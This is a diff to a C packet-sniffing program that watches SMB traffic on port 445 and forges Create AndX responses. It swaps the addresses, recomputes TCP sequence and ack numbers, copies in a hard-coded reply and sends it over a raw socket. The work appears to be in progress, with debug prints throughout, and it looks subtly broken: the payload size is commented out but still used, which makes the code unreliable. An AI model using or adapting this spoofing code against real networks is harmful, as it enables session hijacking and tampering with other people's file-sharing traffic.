@@ -274,10 +274,7 @@ struct sniff_tcp {
 
 /* SMB header */
 struct sniff_smb {
-	//u_int   smb_nb;			/* netbios */
-	u_long  smb_nb;
-	#define SMB_SIZE(smb)	(smb->smb_nb & 0xffffff00)	/* SMB length */
-
+	u_int   smb_nb;			/* netbios */
 	u_int   smb_sc;			/* server component */
 	u_char  smb_cmd;		/* smb command */
 	u_int   smb_stat;		/* nt status */
@@ -310,6 +307,8 @@ struct sniff_smb {
         u_short smb_uid;                /* user id */
         u_short smb_mid;                /* multiplex id */
 };
+#define SMB_SIZE(smb)   (smb->smb_nb & 0xffffff00)      /* SMB length */
+
 
 /* SMB Create AndX Response */
 struct sniff_CAXR {
@@ -352,8 +351,8 @@ struct sniff_CAXR {
 	u_short smb_bc;			/* byte count */
 };
 
-struct sniff_CAXR
-*createAndXResponse(u_char *payload, int size_payload);
+void
+createAndXResponse(u_char *payload, int size_payload);
 
 void
 got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
@@ -519,7 +518,7 @@ void send_raw_ip_packet(struct sniff_ip* ip)
 	close(sock);
 }
 
-struct sniff_CAXR * createAndXResponse(u_char *payload, int size_payload)
+void createAndXResponse(u_char *payload, int size_payload)
 {
 	u_char *newpayload =
 		"\xa2"		// Word count
@@ -545,8 +544,7 @@ struct sniff_CAXR * createAndXResponse(u_char *payload, int size_payload)
 		"\x00\x00\x00\x00"		// Guest maximal access rights
 		"\x00\x00"		// Byte count
 	;
-
-	return (struct sniff_CAXR *)newpayload;
+	memcpy(payload, newpayload, size_payload); 
 }
 	
 
@@ -561,7 +559,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	const char buffer[65536];
 
 	/* declare pointers to packet headers */
-	//struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
+	struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
 	struct sniff_ip *ip;              /* The IP header */
 	struct sniff_tcp *tcp;            /* The TCP header */
 	struct sniff_smb *smb;		/* The SMB header */
@@ -573,7 +571,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	int size_payload;
 	
 	/* define ethernet header */
-	//ethernet = (struct sniff_ethernet*)(packet);
+	ethernet = (struct sniff_ethernet*)(packet);
 	
 	/* define/compute ip header offset */
 	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
@@ -605,19 +603,21 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp + size_smb);
 
 	/* compute smb payload (segment) size */
-	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp + size_smb);
+	//size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp + size_smb);
 
 	/* Make a copy from the original packet */
 	//memset((char*)buffer, 0, 1500);
 	memset((char*)buffer, 0, 65536);
-	memcpy((char*)buffer, ip, ntohs(ip->ip_len));
-	//printf("\nMem location origin: %x\n",(u_int*)ip);
-	//printf("Mem location copy: %x\n",buffer);
+	memcpy((char*)buffer, ip, size_ip + size_tcp + size_smb);
+	//printf("\nMem location origin: %p %x %s\n", ip->ip_src, ip->ip_src, inet_ntoa(ip->ip_src));
+	//printf("\nTCP Mem location origin: %p  %x  %u\n", tcp->th_sport, tcp->th_sport, ntohs(tcp->th_sport));
+        //printf("\nMem location origin: %p %x %u\n", ip, ip, ip);
+        //printf("\nTCP Mem location origin: %p  %x  %u\n", tcp, tcp, tcp);
 	//printf("\nIP_LEN: %u\n", ntohs(ip->ip_len));
-	struct sniff_ip *newip = (struct sniff_ip *) buffer;
+	struct sniff_ip *newip = (struct sniff_ip *) ((u_char *)buffer);
 	struct sniff_tcp *newtcp = (struct sniff_tcp *) ((u_char *)buffer + size_ip);
 	struct sniff_smb *newsmb = (struct sniff_smb *) ((u_char *)buffer + size_ip + size_tcp); 
-	char *newpayload;
+	char *newpayload = ((u_char *)buffer + size_ip + size_tcp + size_smb);
 
 	/* Construct IP header, TCP header, and SMB header */
 	newip->ip_src = ip->ip_dst; 
@@ -629,6 +629,13 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	newtcp->th_seq = tcp->th_ack;
 	newtcp->th_ack = htonl(ntohl(tcp->th_seq) + tcp_seg_len);
 
+	printf("\nSMBSC: %x %x %x %x %x\n", smb->smb_nb, smb->smb_sc, smb->smb_cmd, smb->smb_flg, smb->smb_flg2);
+
+        //printf("\nMem location copy: %p %x %s\n", newip->ip_src, newip->ip_src, inet_ntoa(newip->ip_src));
+        //printf("\nTCP Mem location copy: %p %x  %u\n", newtcp->th_sport, newtcp->th_sport, ntohs(newtcp->th_sport));
+        //printf("\nMem location copy: %p %x %u\n", newip, newip, newip);
+        //printf("\nTCP Mem location copy: %p %x  %u\n", newtcp, newtcp, newtcp);
+
 	//printf("\nOld src: %s   New src: %s\n", inet_ntoa(ip->ip_src), inet_ntoa(newip->ip_src));
 	//printf("Old dst: %s   New dst: %s\n", inet_ntoa(ip->ip_dst), inet_ntoa(newip->ip_dst));
         //printf("\nOld sport: %u   New sport: %u\n", ntohs(tcp->th_sport), ntohs(newtcp->th_sport));
@@ -637,19 +644,23 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	printf("\nOld seq: %u	New seq: %u\n", ntohl(tcp->th_seq), ntohl(newtcp->th_seq));
 	printf("Old ack: %u   New ack: %u\n", ntohl(tcp->th_ack), ntohl(newtcp->th_ack));
 
+	printf("\nsmb_cmd: %x\n", smb->smb_cmd);
 	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_dport) == 445)
 	{
-		newpayload = createAndXResponse(payload, size_payload);
-		printf("\n%u\n", (size_ip + size_tcp + size_smb + size_payload));
-		print_payload(newip, size_ip + size_tcp + size_smb + size_payload);
+		newsmb->smb_flg = (smb)->smb_flg;
+		printf("\nSMB Flag char: %x\n", newsmb->smb_flg);
+		createAndXResponse(newpayload, size_payload);
+		printf("\nNew Packet	Size: %u\n", (size_ip + size_tcp + size_smb + size_payload));
+		print_payload(newsmb, size_smb + size_payload);
 		send_raw_ip_packet(newip);
 	}
-	/*if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_sport) == 445)
+	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_sport) == 445)
 	{
+		printf("\nOld Packet	Size: %u\n", (size_ip + size_tcp + size_smb + size_payload));
 		print_payload(ip, size_ip + size_tcp + size_smb + size_payload);
-	}*/
+	}
 
-	/* Send packet out */
+	//print_payload(ip, size_ip + size_tcp + size_smb + size_payload);
 	//send_raw_ip_packet(newip);
 }
 
